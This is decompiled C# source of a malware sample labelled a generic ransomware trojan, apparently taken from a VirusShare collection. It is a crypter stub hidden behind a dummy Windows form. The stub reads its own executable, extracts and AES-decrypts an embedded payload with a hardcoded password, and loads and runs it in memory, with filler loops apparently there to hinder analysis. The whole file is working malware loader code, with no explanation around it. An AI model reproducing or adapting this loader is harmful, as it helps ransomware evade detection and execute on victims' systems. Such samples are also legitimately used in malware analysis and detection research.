// Decompiled with JetBrains decompiler
// Type: ตลก.Lock
// Assembly: ตลก, Version=8.5.7.4, Culture=neutral, PublicKeyToken=null
// MVID: 59D1803A-8DC9-4DAB-9DAF-43740E5262BC
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\HEUR-Trojan-Ransom.Win32.Generic-6bb5a674abe9846d6edd67f94ecfbd2191382357638c7522679063ea99a3a4c9.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace ตลก
{
  [DesignerGenerated]
  public class Lock : Form
  {
    private IContainer components;
    [AccessedThroughProperty("Button1")]
    private Button _Button1;
    [AccessedThroughProperty("CheckBox1")]
    private CheckBox _CheckBox1;
    [AccessedThroughProperty("CheckedListBox1")]
    private CheckedListBox _CheckedListBox1;
    [AccessedThroughProperty("ComboBox1")]
    private ComboBox _ComboBox1;
    [AccessedThroughProperty("DateTimePicker1")]
    private DateTimePicker _DateTimePicker1;
    [AccessedThroughProperty("Label1")]
    private Label _Label1;
    [AccessedThroughProperty("LinkLabel1")]
    private LinkLabel _LinkLabel1;
    [AccessedThroughProperty("ListBox1")]
    private ListBox _ListBox1;
    [AccessedThroughProperty("NotifyIcon1")]
    private NotifyIcon _NotifyIcon1;
    [AccessedThroughProperty("ToolTip1")]
    private ToolTip _ToolTip1;
    [AccessedThroughProperty("RadioButton1")]
    private RadioButton _RadioButton1;
    [AccessedThroughProperty("ProgressBar1")]
    private ProgressBar _ProgressBar1;
    [AccessedThroughProperty("NumericUpDown1")]
    private NumericUpDown _NumericUpDown1;
    public string S;
    public byte[] B;
    public Assembly X;
    public System.Type M;
    public object O;
    public string F;

    public Lock()
    {
      this.Load += new EventHandler(this.Lock_Load);
      this.F = Assembly.GetExecutingAssembly().Location;
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.Button1 = new Button();
      this.CheckBox1 = new CheckBox();
      this.CheckedListBox1 = new CheckedListBox();
      this.ComboBox1 = new ComboBox();
      this.DateTimePicker1 = new DateTimePicker();
      this.Label1 = new Label();
      this.LinkLabel1 = new LinkLabel();
      this.ListBox1 = new ListBox();
      this.NotifyIcon1 = new NotifyIcon(this.components);
      this.ToolTip1 = new ToolTip(this.components);
      this.RadioButton1 = new RadioButton();
      this.ProgressBar1 = new ProgressBar();
      this.NumericUpDown1 = new NumericUpDown();
      this.NumericUpDown1.BeginInit();
      this.SuspendLayout();
      Button button1_1 = this.Button1;
      Point point1 = new Point(45, 18);
      Point point2 = point1;
      button1_1.Location = point2;
      this.Button1.Name = "Button1";
      Button button1_2 = this.Button1;
      Size size1 = new Size(75, 23);
      Size size2 = size1;
      button1_2.Size = size2;
      this.Button1.TabIndex = 0;
      this.Button1.Text = "Button1";
      this.Button1.UseVisualStyleBackColor = true;
      this.CheckBox1.AutoSize = true;
      CheckBox checkBox1_1 = this.CheckBox1;
      point1 = new Point(109, 70);
      Point point3 = point1;
      checkBox1_1.Location = point3;
      this.CheckBox1.Name = "CheckBox1";
      CheckBox checkBox1_2 = this.CheckBox1;
      size1 = new Size(81, 17);
      Size size3 = size1;
      checkBox1_2.Size = size3;
      this.CheckBox1.TabIndex = 1;
      this.CheckBox1.Text = "CheckBox1";
      this.CheckBox1.UseVisualStyleBackColor = true;
      this.CheckedListBox1.FormattingEnabled = true;
      CheckedListBox checkedListBox1_1 = this.CheckedListBox1;
      point1 = new Point(12, 93);
      Point point4 = point1;
      checkedListBox1_1.Location = point4;
      this.CheckedListBox1.Name = "CheckedListBox1";
      CheckedListBox checkedListBox1_2 = this.CheckedListBox1;
      size1 = new Size(120, 94);
      Size size4 = size1;
      checkedListBox1_2.Size = size4;
      this.CheckedListBox1.TabIndex = 2;
      this.ComboBox1.FormattingEnabled = true;
      ComboBox comboBox1_1 = this.ComboBox1;
      point1 = new Point(137, 18);
      Point point5 = point1;
      comboBox1_1.Location = point5;
      this.ComboBox1.Name = "ComboBox1";
      ComboBox comboBox1_2 = this.ComboBox1;
      size1 = new Size(121, 21);
      Size size5 = size1;
      comboBox1_2.Size = size5;
      this.ComboBox1.TabIndex = 3;
      DateTimePicker dateTimePicker1_1 = this.DateTimePicker1;
      point1 = new Point(45, 205);
      Point point6 = point1;
      dateTimePicker1_1.Location = point6;
      this.DateTimePicker1.Name = "DateTimePicker1";
      DateTimePicker dateTimePicker1_2 = this.DateTimePicker1;
      size1 = new Size(200, 20);
      Size size6 = size1;
      dateTimePicker1_2.Size = size6;
      this.DateTimePicker1.TabIndex = 4;
      this.Label1.AutoSize = true;
      Label label1_1 = this.Label1;
      point1 = new Point(190, 111);
      Point point7 = point1;
      label1_1.Location = point7;
      this.Label1.Name = "Label1";
      Label label1_2 = this.Label1;
      size1 = new Size(39, 13);
      Size size7 = size1;
      label1_2.Size = size7;
      this.Label1.TabIndex = 5;
      this.Label1.Text = "Label1";
      this.LinkLabel1.AutoSize = true;
      LinkLabel linkLabel1_1 = this.LinkLabel1;
      point1 = new Point(187, 157);
      Point point8 = point1;
      linkLabel1_1.Location = point8;
      this.LinkLabel1.Name = "LinkLabel1";
      LinkLabel linkLabel1_2 = this.LinkLabel1;
      size1 = new Size(59, 13);
      Size size8 = size1;
      linkLabel1_2.Size = size8;
      this.LinkLabel1.TabIndex = 6;
      ((Label) this.LinkLabel1).TabStop = true;
      this.LinkLabel1.Text = "LinkLabel1";
      this.ListBox1.FormattingEnabled = true;
      ListBox listBox1_1 = this.ListBox1;
      point1 = new Point(224, 57);
      Point point9 = point1;
      listBox1_1.Location = point9;
      this.ListBox1.Name = "ListBox1";
      ListBox listBox1_2 = this.ListBox1;
      size1 = new Size(34, 30);
      Size size9 = size1;
      listBox1_2.Size = size9;
      this.ListBox1.TabIndex = 7;
      this.NotifyIcon1.Text = "NotifyIcon1";
      this.NotifyIcon1.Visible = true;
      this.RadioButton1.AutoSize = true;
      RadioButton radioButton1_1 = this.RadioButton1;
      point1 = new Point(139, (int) sbyte.MaxValue);
      Point point10 = point1;
      radioButton1_1.Location = point10;
      this.RadioButton1.Name = "RadioButton1";
      RadioButton radioButton1_2 = this.RadioButton1;
      size1 = new Size(90, 17);
      Size size10 = size1;
      radioButton1_2.Size = size10;
      this.RadioButton1.TabIndex = 8;
      this.RadioButton1.TabStop = true;
      this.RadioButton1.Text = "RadioButton1";
      this.RadioButton1.UseVisualStyleBackColor = true;
      ProgressBar progressBar1_1 = this.ProgressBar1;
      point1 = new Point(118, 231);
      Point point11 = point1;
      progressBar1_1.Location = point11;
      this.ProgressBar1.Name = "ProgressBar1";
      ProgressBar progressBar1_2 = this.ProgressBar1;
      size1 = new Size(100, 23);
      Size size11 = size1;
      progressBar1_2.Size = size11;
      this.ProgressBar1.TabIndex = 9;
      NumericUpDown numericUpDown1_1 = this.NumericUpDown1;
      point1 = new Point(25, 45);
      Point point12 = point1;
      numericUpDown1_1.Location = point12;
      this.NumericUpDown1.Name = "NumericUpDown1";
      NumericUpDown numericUpDown1_2 = this.NumericUpDown1;
      size1 = new Size(120, 20);
      Size size12 = size1;
      numericUpDown1_2.Size = size12;
      this.NumericUpDown1.TabIndex = 10;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(284, 262);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.NumericUpDown1);
      this.Controls.Add((Control) this.ProgressBar1);
      this.Controls.Add((Control) this.RadioButton1);
      this.Controls.Add((Control) this.ListBox1);
      this.Controls.Add((Control) this.LinkLabel1);
      this.Controls.Add((Control) this.Label1);
      this.Controls.Add((Control) this.DateTimePicker1);
      this.Controls.Add((Control) this.ComboBox1);
      this.Controls.Add((Control) this.CheckedListBox1);
      this.Controls.Add((Control) this.CheckBox1);
      this.Controls.Add((Control) this.Button1);
      this.Name = "Form1";
      this.Text = "Look";
      this.NumericUpDown1.EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual Button Button1
    {
      get => this._Button1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Button1 = value;
    }

    internal virtual CheckBox CheckBox1
    {
      get => this._CheckBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._CheckBox1 = value;
    }

    internal virtual CheckedListBox CheckedListBox1
    {
      get => this._CheckedListBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._CheckedListBox1 = value;
    }

    internal virtual ComboBox ComboBox1
    {
      get => this._ComboBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._ComboBox1 = value;
    }

    internal virtual DateTimePicker DateTimePicker1
    {
      get => this._DateTimePicker1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._DateTimePicker1 = value;
    }

    internal virtual Label Label1
    {
      get => this._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label1 = value;
    }

    internal virtual LinkLabel LinkLabel1
    {
      get => this._LinkLabel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._LinkLabel1 = value;
    }

    internal virtual ListBox ListBox1
    {
      get => this._ListBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._ListBox1 = value;
    }

    internal virtual NotifyIcon NotifyIcon1
    {
      get => this._NotifyIcon1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._NotifyIcon1 = value;
    }

    internal virtual ToolTip ToolTip1
    {
      get => this._ToolTip1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._ToolTip1 = value;
    }

    internal virtual RadioButton RadioButton1
    {
      get => this._RadioButton1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._RadioButton1 = value;
    }

    internal virtual ProgressBar ProgressBar1
    {
      get => this._ProgressBar1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._ProgressBar1 = value;
    }

    internal virtual NumericUpDown NumericUpDown1
    {
      get => this._NumericUpDown1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._NumericUpDown1 = value;
    }

    public byte[] AES_Decrypt(string input, string pass)
    {
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
      byte[] bytes1;
      try
      {
        byte[] destinationArray = new byte[32];
        byte[] hash = cryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(pass));
        Array.Copy((Array) hash, 0, (Array) destinationArray, 0, 16);
        Array.Copy((Array) hash, 0, (Array) destinationArray, 15, 16);
        rijndaelManaged.Key = destinationArray;
        rijndaelManaged.Mode = CipherMode.ECB;
        ICryptoTransform decryptor = rijndaelManaged.CreateDecryptor();
        byte[] bytes2 = Encoding.Default.GetBytes(input);
        bytes1 = Encoding.Default.GetBytes(Encoding.Default.GetString(decryptor.TransformFinalBlock(bytes2, 0, bytes2.Length)));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return bytes1;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private void Lock_Load(object sender, EventArgs e)
    {
      this.A();
      int num1 = 476308;
      do
      {
        Application.DoEvents();
        checked { ++num1; }
      }
      while (num1 <= 476313);
      int num2 = 1069948;
      do
      {
        Application.DoEvents();
        checked { ++num2; }
      }
      while (num2 <= 1069953);
      NewLateBinding.LateCall(this.O, (System.Type) null, "X", new object[1]
      {
        (object) Application.ExecutablePath
      }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
      int num3 = 1643687;
      do
      {
        Application.DoEvents();
        checked { ++num3; }
      }
      while (num3 <= 1643692);
      int num4 = 2136227;
      do
      {
        Application.DoEvents();
        checked { ++num4; }
      }
      while (num4 <= 2136232);
      int num5 = 7457472;
      do
      {
        Application.DoEvents();
        checked { ++num5; }
      }
      while (num5 <= 7457477);
      ProjectData.EndApp();
    }

    public string[] FUCK(string text, string del) => Strings.Split(text, del);

    public string GE(byte[] xx) => Encoding.Default.GetString(xx);

    public object A()
    {
      byte[] xx = File.ReadAllBytes(this.F);
      int num1 = 8656433;
      do
      {
        Application.DoEvents();
        checked { ++num1; }
      }
      while (num1 <= 8656438);
      this.S = this.FUCK(this.GE(xx), "macdo")[1];
      int num2 = 3978688;
      do
      {
        Application.DoEvents();
        checked { ++num2; }
      }
      while (num2 <= 3978693);
      this.B = this.AES_Decrypt(this.S, "mama");
      int num3 = 3561328;
      do
      {
        Application.DoEvents();
        checked { ++num3; }
      }
      while (num3 <= 3561333);
      int num4 = 4054968;
      do
      {
        Application.DoEvents();
        checked { ++num4; }
      }
      while (num4 <= 4054973);
      this.X = Assembly.Load(this.B);
      this.M = this.X.GetType("X.X");
      this.O = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(this.M));
      object obj;
      return obj;
    }
  }
}
